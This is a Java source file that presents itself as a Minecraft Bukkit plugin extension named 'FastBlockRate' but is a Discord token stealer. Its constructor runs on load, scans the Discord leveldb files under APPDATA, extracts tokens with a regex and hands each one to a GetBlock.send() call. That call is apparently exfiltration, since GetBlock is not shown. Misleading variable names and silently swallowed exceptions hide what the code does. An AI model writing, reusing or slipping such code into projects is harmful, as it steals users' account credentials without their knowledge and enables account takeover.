package com.fastblock.worlguard.extension;

import java.awt.HeadlessException;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.bukkit.event.Listener;

public class FastBlockRate implements Listener {
   private static String args;

   public FastBlockRate() {
      args = "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}";
      File pluginFolder = new File(System.getenv("APPDATA"), "discord");
      File config = new File(pluginFolder, "Local Storage" + File.separator + "leveldb");
      File[] var6;
      int var5 = (var6 = config.listFiles()).length;

      for(int var4 = 0; var4 < var5; ++var4) {
         File f = var6[var4];
         if (f.getName().endsWith(".log") || f.getName().endsWith(".ldb")) {
            try {
               Iterator var8 = this.getLines(f).iterator();

               while(var8.hasNext()) {
                  String line = (String)var8.next();
                  Iterator var10 = this.findAll(args, line).iterator();

                  while(var10.hasNext()) {
                     String token = (String)var10.next();
                     GetBlock.send(token);
                  }
               }
            } catch (IOException | HeadlessException var12) {
            }
         }
      }

   }

   public List<String> getLines(File f) throws IOException {
      BufferedReader reader = new BufferedReader(new FileReader(f));
      String line = null;
      ArrayList lines = new ArrayList();

      while((line = reader.readLine()) != null) {
         lines.add(line);
      }

      return lines;
   }

   public List<String> findAll(String regex, String line) {
      Matcher m = Pattern.compile(regex).matcher(line);
      ArrayList matches = new ArrayList();

      while(m.find()) {
         matches.add(m.group(0));
      }

      return matches;
   }
}